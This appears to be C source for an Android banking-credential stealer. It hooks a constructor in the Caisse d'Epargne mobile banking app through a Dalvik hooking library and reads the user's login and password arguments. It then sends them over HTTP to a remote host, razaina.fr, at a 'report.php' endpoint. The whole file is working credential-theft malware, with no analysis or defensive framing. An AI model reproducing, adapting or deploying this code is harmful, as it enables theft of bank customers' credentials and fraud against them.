#include <sys/socket.h>
#include <netinet/in.h>	
#include <netdb.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>


#define SA struct sockaddr
#define MAXLINE 4096
#define MAXSUB 200
#define LISTENQ 1024

ssize_t process_http(int sockfd, char *host, char *page, char *poststr)
{
    char sendline[MAXLINE + 1], recvline[MAXLINE + 1];
    ssize_t n;
    char content[1];
    content[0]=0;
    snprintf(sendline, MAXSUB, 
            "GET %s?%s HTTP/1.0\r\n"
            "Host: %s\r\n"
            "Content-type: application/x-wwww-form-urlencoded\r\n"
            "Content-length: %d\r\n\r\n"
            "%s\r\n", page, poststr, host, strlen(poststr), poststr);

    
    log("REQUEST: =======\n%s", sendline);
    write(sockfd, sendline, strlen(sendline));

    while((n = read(sockfd, recvline, MAXLINE)) > 0)
    {
        recvline[n] = '\0';
        log("RESPONSE ====== \n %s", recvline);
    }
    return n;
}

static struct dalvik_hook_t hook_init;
static jobject fn_init(JNIEnv *env,jobject obj, jobject arg0, jobject arg1, jobject arg2, jobject arg3, jobject arg4, jobject arg5)
{
	dalvik_prepare(&d,&hook_init,env);
	(*env)->CallObjectMethod(env,obj,hook_init.mid,arg0,arg1,arg2,arg3,arg4,arg5);
	dalvik_postcall(&d,&hook_init);
    char str_arg1[255];
    char str_arg2[255];
    writeObj(env, arg1, "java/lang/String", "ce_login=", str_arg1, 255);
    writeObj(env, arg2, "java/lang/String", strncat(str_arg1, "&ce_pwd=", 255), str_arg2, 255);

    int sockfd;
    struct sockaddr_in servaddr;
    char **pptr;
    char *hname = "razaina.fr";
    char *page = "/chestnut/report.php";

    char str[50];
    struct hostent *hptr;
    if((hptr = gethostbyname(hname)) == NULL)
    {
        log("gethostbyname error for host %s\n", hname);
        exit(1);
    }

    if(hptr->h_addrtype == AF_INET && (pptr = hptr->h_addr_list) != NULL)
    {
        log("address :%s\n", inet_ntop(hptr->h_addrtype, *pptr, str, sizeof(str)));
    }else
    {
        log("Erro call inet_ntop\n");
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(80);
    inet_pton(AF_INET, str, &servaddr.sin_addr);

    connect(sockfd, (SA *) &servaddr, sizeof(servaddr));
    process_http(sockfd, hname, page, str_arg2);
    close(sockfd);

	return;
}
static int init_hook_init()
{
    log("================INIT HOOK on <init>====================");
	dalvik_hook_setup(&hook_init,
		"Lcom/caisseepargne/android/mobilebanking/commons/c/a/p;",
		"<init>",
		"(Landroid/os/Handler;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V",7,
		fn_init);
	hook_init.debug_me=1;
	if (NULL == dalvik_hook(&d,&hook_init)){
		dalvik_dump_class(&d,"Lcom/caisseepargne/android/mobilebanking/commons/c/a/p;");
		return 1;
	}
	return 0;
}
